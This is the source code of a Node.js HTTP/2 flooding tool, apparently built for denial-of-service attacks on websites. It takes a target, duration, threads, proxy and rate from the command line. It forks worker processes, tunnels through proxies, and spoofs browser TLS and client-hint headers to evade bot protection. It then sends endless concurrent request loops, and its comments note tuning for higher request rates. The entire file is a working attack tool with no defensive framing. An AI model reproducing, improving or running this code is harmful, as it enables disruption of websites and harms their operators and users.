const url = require('url')
	, fs = require('fs')
	, http2 = require('http2')
	, http = require('http')
	, tls = require('tls')
	, net = require('net')
	, request = require('request')
	, cluster = require('cluster')
const crypto = require('crypto');
const HPACK = require('hpack');
const currentTime = new Date();
const os = require("os");
const httpTime = currentTime.toUTCString();

const Buffer = require('buffer').Buffer;

const errorHandler = error => {};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUint8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;

    let payload = Buffer.alloc(0);
    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length);
        if (payload.length + offset != length) return null;
    }
    return { streamId, length, type, flags, payload };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

const cplist = [
	'TLS_AES_128_CCM_8_SHA256',
	'TLS_AES_128_CCM_SHA256',
	'TLS_CHACHA20_POLY1305_SHA256',
	'TLS_AES_256_GCM_SHA384',
	'TLS_AES_128_GCM_SHA256'
];
const sigalgs = [
	'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
	'ecdsa_brainpoolP256r1tls13_sha256',
	'ecdsa_brainpoolP384r1tls13_sha384',
	'ecdsa_brainpoolP512r1tls13_sha512',
	'ecdsa_sha1',
	'ed25519',
	'ed448',
	'ecdsa_sha224',
	'rsa_pkcs1_sha1',
	'rsa_pss_pss_sha256',
	'dsa_sha256',
	'dsa_sha384',
	'dsa_sha512',
	'dsa_sha224',
	'dsa_sha1',
	'rsa_pss_pss_sha384',
	'rsa_pkcs1_sha2240',
	'rsa_pss_pss_sha512',
	'sm2sig_sm3',
	'ecdsa_secp521r1_sha512'
];
let sig = sigalgs.join(':');

const controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400'];
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

const headerFunc = {
	cipher() {
		return cplist[Math.floor(Math.random() * cplist.length)];
	}
};

process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);

const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxyFile = process.argv[5];
const rps = process.argv[6];

proxyr = proxyFile;

const MAX_RAM_PERCENTAGE = 90;
const RESTART_DELAY = 100;

if (cluster.isMaster) {
    for (let counter = 1; counter <= thread; counter++) {
        cluster.fork();
    }
    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        setTimeout(() => {
            for (let counter = 1; counter <= thread; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };
    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;
        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            restartScript();
        }
    };
    setInterval(handleRAMUsage, 5000);
    setTimeout(() => process.exit(-1), time * 1000);
} else {
    setInterval(flood, 70); // Reduced interval for higher frequency
}

function getSecChUa(userAgent) {
    let browser = '';
    let version = '';
    let platform = 'Windows';
    const uaParts = userAgent.split(' ');
    for (const part of uaParts) {
        if (part.includes('Tor/') || part.includes('Firefox/') || part.includes('Chrome/') || part.includes('Safari/')) {
            const [browserName, browserVersion] = part.split('/');
            browser = browserName === 'Tor' ? 'Firefox' : browserName;
            version = browserVersion.split('.')[0];
            break;
        }
        if (part.includes('Windows')) platform = 'Windows';
        else if (part.includes('Linux')) platform = 'Linux';
        else if (part.includes('Mac')) platform = 'macOS';
    }
    if (browser && version) {
        if (browser === 'Firefox' || browser === 'Tor') {
            return `"Firefox";v="${version}", "Not A(Brand";v="99", "Chromium";v="${version}"`;
        } else if (browser === 'Chrome') {
            return `"Google Chrome";v="${version}", "Chromium";v="${version}", "Not A(Brand";v="99"`;
        } else if (browser === 'Safari') {
            return `"Safari";v="${version}", "Not A(Brand";v="99"`;
        }
    }
    return `"Not A(Brand";v="99", "Chromium";v="135", "Google Chrome";v="135"`;
}

function flood() {
    var parsed = url.parse(target);
    var cipper = headerFunc.cipher();
    var proxy = proxyr.split(':');

    function randstr(minLength, maxLength) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
        return Array.from({ length }, () => characters.charAt(Math.floor(Math.random() * characters.length))).join('');
    }

    function shuffleObject(obj) {
        const keys = Object.keys(obj);
        for (let i = keys.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [keys[i], keys[j]] = [keys[j], keys[i]];
        }
        const shuffledObject = {};
        for (const key of keys) shuffledObject[key] = obj[key];
        return shuffledObject;
    }

    const userAgent = process.argv[8];
    const secChUa = getSecChUa(userAgent);

    const headers = {
        ":method": "GET",
        ":authority": parsed.host,
        ":scheme": "https",
        ":path": parsed.path,
        "sec-ch-ua": secChUa,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "navigate",
        "sec-fetch-dest": "document",
        "user-agent": userAgent,
        "cookie": process.argv[7]
    };

    const agent = new http.Agent({
        host: proxy[0],
        port: proxy[1],
        keepAlive: true,
        keepAliveMsecs: 500000,
        maxSockets: 10000, // Increased for higher concurrency
        maxTotalSockets: 20000
    });

    const Optionsreq = {
        agent: agent,
        method: 'CONNECT',
        path: parsed.host + ':443',
        timeout: 5000,
        headers: {
            'Host': parsed.host,
            'Proxy-Connection': 'Keep-Alive',
            'Connection': 'close',
            'Proxy-Authorization': `Basic ${Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64')}`
        }
    };

    const connection = http.request(Optionsreq);

    const TLSOPTION = {
        ciphers: cipper,
        minVersion: 'TLSv1.3',
        maxVersion: 'TLSv1.3',
        sigals: sig,
        secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_ALL,
        echdCurve: "X25519",
        secure: true,
        rejectUnauthorized: false,
        ALPNProtocols: ['h2']
    };

    function createCustomTLSSocket(parsed, socket) {
        const tlsSocket = tls.connect({
            ...TLSOPTION,
            host: parsed.host,
            port: 443,
            servername: parsed.host,
            socket: socket
        });
        tlsSocket.setKeepAlive(true, 60000);
        tlsSocket.setNoDelay(true);
        tlsSocket.setMaxListeners(0);
        return tlsSocket;
    }

    connection.on('connect', function (res, socket) {
        const tlsSocket = createCustomTLSSocket(parsed, socket);
        socket.setKeepAlive(true, 100000);

        const client = http2.connect(parsed.href, {
            settings: {
                maxConcurrentStreams: 100, // Increased for higher request rate
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                enablePush: false
            },
            createConnection: () => tlsSocket
        });

        client.setMaxListeners(0);

        const sendRequests = async () => {
            while (true) {
                const request = client.request(headers, { endStream: true });
                request.on('response', () => request.close(http2.constants.NO_ERROR));
                request.on('error', () => {});
                request.end();
                await new Promise(resolve => setImmediate(resolve)); // Immediate next request
            }
        };

        // Start multiple concurrent request loops
        for (let i = 0; i < 10; i++) { // Multiple loops for higher concurrency
            sendRequests().catch(() => {});
        }

        client.on('close', () => {
            client.destroy();
            tlsSocket.destroy();
            socket.destroy();
        });

        client.on('error', (error) => {
            if (error.code === 'ERR_HTTP2_GOAWAY_SESSION') {
                setTimeout(flood, 1000); // Reconnect quickly
            } else {
                client.destroy();
                tlsSocket.destroy();
                socket.destroy();
            }
        });
    });

    connection.on('error', () => connection.destroy());
    connection.on('timeout', () => connection.destroy());
    connection.end();
}